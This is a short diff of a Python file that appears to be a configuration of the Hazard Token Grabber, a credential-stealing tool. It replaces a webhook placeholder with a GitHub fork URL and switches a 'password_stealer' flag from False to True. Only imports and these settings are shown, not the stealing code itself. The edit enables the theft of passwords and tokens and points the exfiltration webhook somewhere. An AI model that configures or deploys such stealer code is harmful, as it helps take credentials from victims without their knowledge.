@@ -11,8 +11,8 @@ from subprocess import Popen, PIPE
 from urllib.request import Request, urlopen
 from datetime import datetime
 
-webhook_url = "YOUR_WEBHOOK_HERE"
-password_stealer = False
+webhook_url = "https://github.com/Rdimo/Hazard-Token-Grabber/fork"
+password_stealer = True
 
 languages = {
 	'da'    : 'Danish, Denmark',
